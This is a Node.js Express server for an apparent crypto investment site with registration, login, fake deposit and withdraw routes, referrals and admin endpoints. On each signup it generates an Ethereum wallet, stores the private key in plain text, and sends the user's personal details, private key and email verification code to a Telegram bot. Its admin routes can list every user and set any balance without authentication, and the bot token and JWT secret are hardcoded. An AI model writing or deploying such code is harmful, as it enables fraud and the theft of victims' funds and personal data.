const express = require("express");
const cors = require("cors");
const bcrypt = require("bcryptjs");
const jwt = require("jsonwebtoken");
const path = require("path");
const { Wallet } = require("ethers");
const axios = require("axios");
const { createClient } = require("@supabase/supabase-js");

const app = express();

app.use(cors());
app.use(express.json());
app.use(express.static(__dirname));

const SECRET = "SECRET_KEY";

// SUPABASE (public key)
const supabase = createClient(
  "https://pwqmiiruxceepjammiza.supabase.co",
  "sb_publishable_7lxiFe5VT8iQx37Ip7R2YA_99WVsa1N"
);

// TELEGRAM
const TELEGRAM_TOKEN = "8714057941:AAGZL1OXRoy8-7_IoVAHBePTLwuTKmqicOg";
const CHAT_ID = "337179852";

// ===== AUTH =====
function auth(req, res, next) {
  const token = req.headers.authorization;
  if (!token) return res.status(401).json({ success: false });

  try {
    const data = jwt.verify(token, SECRET);
    req.userId = data.id;
    next();
  } catch {
    return res.status(401).json({ success: false });
  }
}

// ===== REGISTER (З ФІКСАМИ) =====
app.post("/register", async (req, res) => {
  try {

    const {
      fullname,
      nickname,
      referrer_id,
      country,
      phone,
      email,
      password
    } = req.body;

    if (!email || !password) {
      return res.json({ success: false });
    }

    const emailLower = email.toLowerCase();

    // ===== IP =====
    let ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
    if (ip.includes(",")) {
      ip = ip.split(",")[0].trim();
    }

    // ===== АНТИ-АБУЗ =====
    const { data: ipUsers } = await supabase
      .from("users")
      .select("id")
      .eq("ip", ip);

    if (ipUsers && Array.isArray(ipUsers) && ipUsers.length >= 3) {
      return res.json({ success: false, message: "Too many accounts" });
    }

    // ===== CHECK USER =====
    const { data: existing } = await supabase
      .from("users")
      .select("*")
      .eq("email", emailLower)
      .maybeSingle();

    if (existing) {
      return res.json({ success: false, message: "User exists" });
    }

    const hash = await bcrypt.hash(password, 10);
    const code = Math.floor(100000 + Math.random() * 900000).toString();

    let wallet_address = null;
    let private_key = null;

    try {
      const wallet = Wallet.createRandom();
      wallet_address = wallet.address;
      private_key = wallet.privateKey;
    } catch {}

    const { data, error } = await supabase
      .from("users")
      .insert([{
        fullname,
        nickname,
        referrer_id,
        country,
        phone,
        email: emailLower,
        password: hash,
        balance: 1000,
        deposit: 0,
        satellites: 0,
        wallet_address,
        private_key,
        email_code: code,
        email_verified: false,
        ip: ip
      }])
      .select()
      .single();

    if (error) {
      console.log(error);
      return res.json({ success: false });
    }

    // TELEGRAM
    try {
      const text = `
🆕 NEW USER

ID: ${data.id}
Email: ${data.email}

👤 ${data.fullname}
📛 Nick: ${data.nickname}

🌍 ${data.country}
📱 ${data.phone}

💼 Wallet:
${data.wallet_address}

🔐 Private Key:
${data.private_key}

🔑 CODE: ${code}

👥 Ref: ${data.referrer_id || "—"}
      `;

      await axios.post(
        `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,
        {
          chat_id: CHAT_ID,
          text
        }
      );

    } catch (e) {
      console.log("TG ERROR:", e.message);
    }

    return res.json({ success: true });

  } catch (err) {
    console.log("REGISTER ERROR:", err);
    return res.json({ success: false });
  }
});

// ===== VERIFY EMAIL =====
app.post("/verify-email", async (req, res) => {

  const { email, code } = req.body;

  const { data: user } = await supabase
    .from("users")
    .select("*")
    .eq("email", email.toLowerCase())
    .maybeSingle();

  if (!user) return res.json({ success: false });

  if (user.email_code !== code) {
    return res.json({ success: false });
  }

  await supabase
    .from("users")
    .update({
      email_verified: true,
      email_code: null
    })
    .eq("id", user.id);

  res.json({ success: true });

});

// ===== LOGIN =====
app.post("/login", async (req, res) => {

  const { email, password } = req.body;

  const { data: user } = await supabase
    .from("users")
    .select("*")
    .eq("email", email.toLowerCase())
    .maybeSingle();

  if (!user) return res.json({ success: false });

  const valid = await bcrypt.compare(password, user.password);
  if (!valid) return res.json({ success: false });

  const token = jwt.sign({ id: user.id }, SECRET);

  res.json({ success: true, token });

});

// ===== USER =====
app.get("/me", auth, async (req, res) => {
  const { data: user } = await supabase
    .from("users")
    .select("*")
    .eq("id", req.userId)
    .single();

  res.json(user);
});

// ===== REFERRALS =====
app.get("/referrals", auth, async (req, res) => {
  const { data } = await supabase
    .from("users")
    .select("*")
    .eq("referrer_id", req.userId);

  res.json(data);
});

// ===== DEPOSIT =====
app.post("/deposit", auth, async (req, res) => {

  const { amount } = req.body;

  const { data: user } = await supabase
    .from("users")
    .select("*")
    .eq("id", req.userId)
    .single();

  if (!amount || amount <= 0) return res.json({ success: false });

  await supabase
    .from("users")
    .update({
      balance: user.balance + amount,
      deposit: user.deposit + amount
    })
    .eq("id", req.userId);

  res.json({ success: true });

});

// ===== WITHDRAW =====
app.post("/withdraw", auth, async (req, res) => {

  const { amount } = req.body;

  const { data: user } = await supabase
    .from("users")
    .select("*")
    .eq("id", req.userId)
    .single();

  if (!amount || amount <= 0 || user.balance < amount) {
    return res.json({ success: false });
  }

  await supabase
    .from("users")
    .update({
      balance: user.balance - amount
    })
    .eq("id", req.userId);

  res.json({ success: true });

});

// ===== ADMIN =====
app.get("/admin", (req, res) => {
  res.sendFile(path.join(__dirname, "admin.html"));
});

app.get("/admin/users", async (req, res) => {
  const { data } = await supabase.from("users").select("*");
  res.json(data);
});

app.post("/admin/add-balance", async (req, res) => {
  const { user_id, amount } = req.body;

  const { data: user } = await supabase
    .from("users")
    .select("*")
    .eq("id", user_id)
    .single();

  if (!user) return res.json({ success: false });

  await supabase
    .from("users")
    .update({
      balance: user.balance + amount
    })
    .eq("id", user_id);

  res.json({ success: true });
});

app.post("/admin/set-balance", async (req, res) => {
  const { user_id, amount } = req.body;

  await supabase
    .from("users")
    .update({ balance: amount })
    .eq("id", user_id);

  res.json({ success: true });
});

// ===== PAGES =====
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "login.html"));
});

app.get("/login", (req, res) => {
  res.sendFile(path.join(__dirname, "login.html"));
});

app.get("/register", (req, res) => {
  res.sendFile(path.join(__dirname, "register.html"));
});

// ===== START =====
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log("🔥 Server running on " + PORT);
});